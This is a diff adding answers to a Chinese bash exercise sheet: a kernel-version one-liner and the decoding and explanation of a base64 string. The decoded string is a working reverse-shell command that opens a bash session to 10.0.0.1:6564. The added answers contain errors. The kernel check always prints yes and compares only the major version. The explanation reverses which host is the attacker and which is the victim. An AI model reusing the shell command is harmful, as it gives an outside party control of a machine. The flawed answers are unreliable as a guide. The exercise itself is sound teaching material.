@@ -29,7 +29,7 @@ do
      continue
    else
      echo "smaller"
-     continue
+     continue  
    fi
 
 done
@@ -38,10 +38,20 @@ done
  log2(1000）取整+1 = 10 次
 
 4. 用bash比较当前系统，linux 内核版本号，是否大于5.4以上，是的话打印yes否则no. 尽量一行达成。 hint: 可用bc命令辅助。
-
+[ $(echo "`uname -r |awk -F . '{print $1}'`" -5 |bc) -ge 0 ] && [ $(echo "`uname -r |awk -F . '{print $1}'`" - 4 |bc) -gt 0 ];  echo “yes” || echo "no"
 
 5. (a). 尝试解码以下字符串：
 MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4wLjAuMS82NTY0
 OyBiYXNoIDwmMTk2ID4mMTk2IDI+JjE5Ng==
 (b). 解码后命令代表什么意思？给出详细过程
 
+(a). echo "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4wLjAuMS82NTY0OyBiYXNoIDwmMTk2ID4mMTk2IDI+JjE5Ng==" | base64 -d
+
+(b).  解码后内容如下：
+    0<&196;   ##把文件描述符196的内容输出到标准输入
+    exec 196<>/dev/tcp/10.0.0.1/6564;   #把文件描述符196输入输出重定向到/dev/tcp/10.0.0.1/6564
+    bash <&196 >&196 2>&196  #把文件描述符196内容重定向bash, bash标准输出和错误重定向到196文件描述符
+    总的来说就是攻击机实现了对受害机10.0.0.1:6564实行监听，可以在远程机通过bash shell对受害机进行攻击
+
+
+    
